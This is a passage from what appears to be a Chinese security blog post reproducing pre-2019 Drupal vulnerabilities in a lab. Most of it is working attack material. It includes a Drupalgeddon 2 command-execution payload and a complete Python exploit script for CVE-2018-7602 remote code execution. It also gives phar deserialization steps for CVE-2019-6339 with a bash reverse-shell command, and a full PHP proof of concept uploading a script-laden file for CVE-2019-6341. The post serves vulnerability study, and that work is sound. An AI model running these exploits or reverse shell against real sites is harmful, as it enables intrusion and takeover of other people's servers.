application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure>
+
+<p>执行id</p>
+<p><img src="/imgs/image-20201130151519421.png" alt="image-20201130151519421"></p>
+<h3 id="CVE-2018-7602-远程代码执行"><a href="#CVE-2018-7602-远程代码执行" class="headerlink" title="CVE-2018-7602 远程代码执行"></a>CVE-2018-7602 远程代码执行</h3><p>利用条件：需要帐号信息</p>
+<h4 id="POC：-2"><a href="#POC：-2" class="headerlink" title="POC："></a>POC：</h4><p>python3 drupa7-CVE-2018-7602.py -c “id” drupal drupal <a href="http://127.0.0.1:8081/" target="_blank" rel="noopener">http://127.0.0.1:8081/</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_args</span><span class="params">()</span>:</span></span><br><span class="line">  parser = argparse.ArgumentParser( prog=<span class="string">"drupa7-CVE-2018-7602.py"</span>,</span><br><span class="line">                    formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                    epilog= <span class="string">'''</span></span><br><span class="line"><span class="string">                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58</span></span><br><span class="line"><span class="string">                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form) </span></span><br><span class="line"><span class="string">                    with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax).</span></span><br><span class="line"><span class="string">                    '''</span>)</span><br><span class="line"></span><br><span class="line">  parser.add_argument(<span class="string">"user"</span>, help=<span class="string">"Username"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"password"</span>, help=<span class="string">"Password"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"target"</span>, help=<span class="string">"URL of target Drupal site (ex: http://target.com/)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, default=<span class="string">"id"</span>, help=<span class="string">"Command to execute (default = id)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-f"</span>, <span class="string">"--function"</span>, default=<span class="string">"passthru"</span>, help=<span class="string">"Function to use as attack vector (default = passthru)"</span>)</span><br><span class="line">  parser.add_argument(<span class="string">"-x"</span>, <span class="string">"--proxy"</span>, default=<span class="string">""</span>, help=<span class="string">"Configure a proxy in the format http://127.0.0.1:8080/ (default = none)"</span>)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn_target</span><span class="params">(target, username, password, function, command, proxy)</span>:</span></span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  session = requests.Session()</span><br><span class="line">  proxyConf = &#123;<span class="string">'http'</span>: proxy, <span class="string">'https'</span>: proxy&#125;</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">'[*] Creating a session using the provided credential...'</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/login'</span>&#125;</span><br><span class="line">    post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_login'</span>, <span class="string">'name'</span>: username, <span class="string">'pass'</span> : password, <span class="string">'op'</span>:<span class="string">'Log in'</span>&#125;</span><br><span class="line">    print(<span class="string">'[*] Finding User ID...'</span>)</span><br><span class="line">    session.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>:<span class="string">'user'</span>&#125;</span><br><span class="line">    r = session.get(target, params=get_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    user_id = soup.find(<span class="string">'meta'</span>, &#123;<span class="string">'property'</span>: <span class="string">'foaf:name'</span>&#125;).get(<span class="string">'about'</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"?q="</span> <span class="keyword">in</span> user_id):</span><br><span class="line">      user_id = user_id.split(<span class="string">"="</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span>(user_id):</span><br><span class="line">      print(<span class="string">'[*] User ID found: '</span> + user_id)</span><br><span class="line">    print(<span class="string">'[*] Poisoning a form using \'destination\' and including it in cache.'</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>: user_id + <span class="string">'/cancel'</span>&#125;</span><br><span class="line">    r = session.get(target, params=get_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    form = soup.find(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-cancel-confirm-form'</span>&#125;)</span><br><span class="line">    form_token = form.find(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_token'</span>&#125;).get(<span class="string">'value'</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>: user_id + <span class="string">'/cancel'</span>, <span class="string">'destination'</span> : user_id +<span class="string">'/cancel?q[%23post_render][]='</span> + function + <span class="string">'&amp;q[%23type]=markup&amp;q[%23markup]='</span> + command &#125;</span><br><span class="line">    post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_cancel_confirm_form'</span>,<span class="string">'form_token'</span>: form_token, <span class="string">'_triggering_element_name'</span>:<span class="string">'form_id'</span>, <span class="string">'op'</span>:<span class="string">'Cancel account'</span>&#125;</span><br><span class="line">    r = session.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    form = soup.find(<span class="string">'form'</span>, &#123;<span class="string">'id'</span>: <span class="string">'user-cancel-confirm-form'</span>&#125;)</span><br><span class="line">    form_build_id = form.find(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>: <span class="string">'form_build_id'</span>&#125;).get(<span class="string">'value'</span>)</span><br><span class="line">    <span class="keyword">if</span> form_build_id:</span><br><span class="line">        print(<span class="string">'[*] Poisoned form ID: '</span> + form_build_id)</span><br><span class="line">        print(<span class="string">'[*] Triggering exploit to execute: '</span> + command)</span><br><span class="line">        get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/actions/cancel/#options/path/'</span> + form_build_id&#125;</span><br><span class="line">        post_params = &#123;<span class="string">'form_build_id'</span>:form_build_id&#125;</span><br><span class="line">        r = session.post(target, params=get_params, data=post_params, verify=<span class="literal">False</span>, proxies=proxyConf)</span><br><span class="line">        parsed_result = r.text.split(<span class="string">'[&#123;"command":"settings"'</span>)[<span class="number">0</span>]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"ERROR: Something went wrong."</span>)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> ()</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'==================================================================================='</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |'</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'|                                   by pimps                                      |'</span>)</span><br><span class="line">  <span class="keyword">print</span> (<span class="string">'===================================================================================\n'</span>)</span><br><span class="line"></span><br><span class="line">  args = get_args() <span class="comment"># get the cl args</span></span><br><span class="line">  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20201130162325179.png" alt="image-20201130162325179"></p>
+<h3 id="CVE-2019-6339-远程代码执行"><a href="#CVE-2019-6339-远程代码执行" class="headerlink" title="CVE-2019-6339 远程代码执行"></a>CVE-2019-6339 远程代码执行</h3><p>利用条件：需要管理员帐号信息</p>
+<p>下载利用文件：<a href="https://github.com/thezdi/PoC/tree/master/Drupal" target="_blank" rel="noopener">https://github.com/thezdi/PoC/tree/master/Drupal</a></p>
+<p>进入用户编辑界面<a href="http://192.168.116.132:8080/user/1/edit，上传图片并保存" target="_blank" rel="noopener">http://192.168.116.132:8080/user/1/edit，上传图片并保存</a></p>
+<p><img src="/imgs/image-20201130164147956.png" alt="image-20201130164147956"></p>
+<p>进入<a href="http://192.168.116.132:8080/admin/config/media/file-system界面，在Temporary" target="_blank" rel="noopener">http://192.168.116.132:8080/admin/config/media/file-system界面，在Temporary</a> directory处输入：phar://./sites/default/files/pictures/2020-11/blog-ZDI-CAN-7232-cat.jpg点击保存</p>
+<p><img src="/imgs/image-20201130164759989.png" alt="image-20201130164759989"></p>
+<p><img src="/imgs/image-20201130164743816.png" alt="image-20201130164743816"></p>
+<p>修改命令为创建文件1111：</p>
+<p><img src="/imgs/image-20201130172257094.png" alt="image-20201130172257094"></p>
+<p><img src="/imgs/image-20201130172307261.png" alt="image-20201130172307261"></p>
+<p>尝试getshell，修改图片：s为50即命令字符数为50，命令为/bin/bash -i &gt;&amp; /dev/tcp/192.168.116.132/9999 0&gt;&amp;1。反弹未成功</p>
+<p><img src="/imgs/image-20201130171025740.png" alt="image-20201130171025740"></p>
+<h3 id="CVE-2019-6341-XSS"><a href="#CVE-2019-6341-XSS" class="headerlink" title="CVE-2019-6341 XSS"></a>CVE-2019-6341 XSS</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>php blog-poc.php 192.168.116.132 8080</p>
+<figure class="highlight php"><figcaption><span>blog-poc.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">usage: php poc.php &lt;target-ip&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Date: 1 March 2019</span></span><br><span class="line"><span class="comment">Exploit Author: TrendyTofu</span></span><br><span class="line"><span class="comment">Original Discoverer: Sam Thomas</span></span><br><span class="line"><span class="comment">Version: &lt;= Drupal 8.6.2</span></span><br><span class="line"><span class="comment">Tested on: Drupal 8.6.2 Ubuntu 18.04 LTS x64 with ext4.</span></span><br><span class="line"><span class="comment">Tested not wokring on: Drupal running on MacOS with APFS</span></span><br><span class="line"><span class="comment">CVE : CVE-2019-6341</span></span><br><span class="line"><span class="comment">Reference: https://www.zerodayinitiative.com/advisories/ZDI-19-291/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$port = <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">$pk =   <span class="string">"GET /user/register HTTP/1.1\r\n"</span>.</span><br><span class="line">	<span class="string">"Host: "</span>.$host.<span class="string">"\r\n"</span>.</span><br><span class="line">	<span class="string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"</span>.</span><br><span class="line">	<span class="string">"Accept-Language: en-US,en;q=0.5\r\n"</span>.</span><br><span class="line">	<span class="string">"Referer: http://"</span>.$host.<span class="string">"/user/login\r\n"</span>.</span><br><span class="line">	<span class="string">"Connection: close\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($host,$port,$e,$err,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;<span class="keyword">die</span>(<span class="string">"not connected"</span>);&#125;</span><br><span class="line">fputs($fp,$pk);</span><br><span class="line">$out=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">  $out.=fread($fp,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/name="form_build_id" value="(.*)"/'</span>, $out, $match);</span><br><span class="line">$formid = $match[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//var_dump($formid);</span></span><br><span class="line"><span class="comment">//echo "form id is:". $formid;</span></span><br><span class="line"><span class="comment">//echo $out."\n";</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$data = </span><br><span class="line"><span class="string">"Content-Type: multipart/form-data; boundary=---------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Connection: close\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"mail\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"test324@example.com\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"name\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"test2345\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"files[user_picture_0]\"; filename=\"xxx\xc0.gif\"\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Type: image/gif\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"GIF\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;HTML&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"	&lt;HEAD&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"		&lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"	&lt;/HEAD&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"	&lt;BODY&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"	&lt;/BODY&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;/HTML&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"user_picture[0][fids]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"user_picture[0][display]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"form_build_id\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="comment">//"form-KyXRvDVovOBjofviDPTw682MQ8Bf5es0PyF-AA2Buuk\r\n".</span></span><br><span class="line">$formid.<span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"form_id\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"user_register_form\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"contact\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"timezone\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"America/New_York\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_triggering_element_name\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"user_picture_0_upload_button\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_triggering_element_value\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"Upload\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_drupal_ajax\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[theme]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"bartik\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[theme_token]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[libraries]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"bartik/global-styling,classy/base,classy/messages,core/drupal.ajax,core/drupal.collapse,core/drupal.timezone,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,system/base\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325--\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$pk = 	<span class="string">"POST /user/register?element_parents=user_picture/widget/0&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1\r\n"</span>.</span><br><span class="line">	<span class="string">"Host: "</span>.$host.<span class="string">"\r\n"</span>.</span><br><span class="line">	<span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"</span>.</span><br><span class="line">	<span class="string">"Accept: application/json, text/javascript, */*; q=0.01\r\n"</span>.</span><br><span class="line">	<span class="string">"Accept-Language: en-US,en;q=0.5\r\n"</span>.</span><br><span class="line">	<span class="string">"X-Requested-With: XMLHttpRequest\r\n"</span>.</span><br><span class="line">	<span class="string">"Referer: http://"</span> .$host. <span class="string">"/user/register\r\n"</span>.</span><br><span class="line">	<span class="string">"Content-Length: "</span>. strlen($data). <span class="string">"\r\n"</span>.</span><br><span class="line">	$data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"uploading file, please wait...\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i =<span class="number">1</span>; $i &lt;= <span class="number">2</span>; $i++)&#123;</span><br><span class="line">$fp = fsockopen($host,$port,$e,$err,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;<span class="keyword">die</span>(<span class="string">"not connected"</span>);&#125;</span><br><span class="line">fputs($fp,$pk);</span><br><span class="line">$out=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">  $out.=fread($fp,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Got "</span>.$i.<span class="string">"/2 500 errors\n"</span>;</span><br><span class="line"><span class="comment">//echo $out."\n";</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please check /var/www/html/drupal/sites/default/files/pictures/YYYY-MM\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20201130185053451.png" alt="image-20201130185053451"></p>
+<p><img src="/imgs/image-20201130185600912.png" alt="image-20201130185600912"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2014-3704-SQL注入漏洞"><span class="toc-number">1.</span> <span class="toc-text">CVE-2014-3704 SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc"><span class="toc-number">1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-重置管理员用户为指定用户信息"><span class="toc-number">1.2.</span> <span class="toc-text">EXP -重置管理员用户为指定用户信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-6920-Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞"><span class="toc-number">2.</span> <span class="toc-text">CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC："><span class="toc-number">2.1.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-7600-Drupal-Drupalgeddon-2-远程代码执行"><span class="toc-number">3.</span> <span class="toc-text">CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC：-1"><span class="toc-number">3.1.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-7602-远程代码执行"><span class="toc-number">4.</span> <span class="toc-text">CVE-2018-7602 远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC：-2"><span class="toc-number">4.1.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-6339-远程代码执行"><span class="toc-number">5.</span> <span class="toc-text">CVE-2019-6339 远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-6341-XSS"><span class="toc-number">6.</span> <span class="toc-text">CVE-2019-6341 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">6.1.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
